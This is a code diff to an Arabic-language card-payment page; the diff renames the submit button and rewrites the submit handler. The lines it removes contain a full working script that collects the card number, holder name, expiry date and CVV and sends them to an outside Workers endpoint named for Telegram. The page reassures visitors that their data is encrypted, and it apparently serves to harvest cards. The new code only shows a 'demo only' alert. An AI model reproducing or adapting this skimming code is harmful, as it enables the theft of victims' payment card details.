@@ -258,7 +258,7 @@
         </label>
         <div id="termsError" class="error-msg"></div>
 
-        <button id="sendToTelegram" class="btn-pay" type="submit" disabled>🔒 المتابعة للدفع</button>
+        <button id="nextBtn" class="btn-pay" type="submit" disabled>🔒 المتابعة للدفع</button>
       </form>
 
       <div class="security">🔐 جميع البيانات مشفرة ومحمية بتقنية SSL 256-bit</div>
@@ -271,7 +271,7 @@
     const cvvInput = document.getElementById('cvv');
     const holderInput = document.getElementById('cardHolder');
     const termsCheckbox = document.getElementById('termsCheckbox');
-    const submitBtn = document.getElementById('sendToTelegram');
+    const submitBtn = document.getElementById('nextBtn');
 
     function showError(id, message) {
       const el = document.getElementById(id);
@@ -362,100 +362,41 @@
     termsCheckbox.addEventListener('change', validateRealtime);
 
     document.getElementById('paymentForm').addEventListener('submit', function (event) {
-    event.preventDefault();
-    clearAllErrors();
+      event.preventDefault();
+      clearAllErrors();
 
-    let valid = true;
+      let valid = true;
+      const card = cardNumberInput.value.replace(/\s+/g, '');
+      const holder = holderInput.value.trim();
+      const expiry = expiryInput.value;
+      const cvv = cvvInput.value;
+      const terms = termsCheckbox.checked;
 
-    const card = cardNumberInput.value.replace(/\s+/g, '');
-    const holder = holderInput.value.trim();
-    const expiry = expiryInput.value;
-    const cvv = cvvInput.value;
-    const terms = termsCheckbox.checked;
-
-    if (!isValidLuhn(card)) {
+      if (!isValidLuhn(card)) {
         showError('cardNumberError', 'رقم البطاقة غير صحيح');
         valid = false;
-    }
-
-    if (holder.length < 3) {
+      }
+      if (holder.length < 3) {
         showError('cardHolderError', 'اسم حامل البطاقة مطلوب');
         valid = false;
-    }
-
-    if (!isValidExpiry(expiry)) {
+      }
+      if (!isValidExpiry(expiry)) {
         showError('expiryDateError', 'تاريخ الانتهاء غير صحيح');
         valid = false;
-    }
-
-    if (!/^\d{3,4}$/.test(cvv)) {
+      }
+      if (!/^\d{3,4}$/.test(cvv)) {
         showError('cvvError', 'CVV غير صحيح');
         valid = false;
-    }
-
-    if (!terms) {
+      }
+      if (!terms) {
         showError('termsError', 'يجب الموافقة على الشروط والأحكام');
         valid = false;
-    }
+      }
 
-    if (valid) {
-        window.location.href = './Untitled-1.html';
-    }
-});
-  </script>
-
-<script>
- const API_URL =
-  "https://telegram-site-api.adhmarmr766.workers.dev/submit";
-  document
-    .getElementById("sendToTelegram")
-    .addEventListener("click", async () => {
-      const button = document.getElementById(
-  "sendToTelegram"
-);
-      const form = document.getElementById("paymentForm");
-const data = {};
-
-form.querySelectorAll("input, select, textarea").forEach((field) => {
-  const key = field.name || field.id;
-
-  if (
-    key &&
-    field.type !== "password" &&
-    field.type !== "hidden" &&
-    field.type !== "submit" &&
-    field.type !== "button" &&
-    field.type !== "checkbox" &&
-    field.type !== "radio"
-  ) {
-    data[key] = field.value.trim();
-  }
-});
-
-      button.disabled = true;
-
-      try {
-        const response = await fetch(API_URL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(data)
-        });
-
-        if (!response.ok) {
-          throw new Error("فشل إرسال البيانات");
-        }
-
-        alert("تم إرسال البيانات بنجاح");
-      } catch (error) {
-        console.error(error);
-        alert("تعذّر الإرسال، حاول مرة أخرى");
-      } finally {
-        button.disabled = false;
+      if (valid) {
+        alert('تمت معالجة الدفع بنجاح (عرض توضيحي فقط).');
       }
     });
-</script>
-
+  </script>
 </body>
 </html>
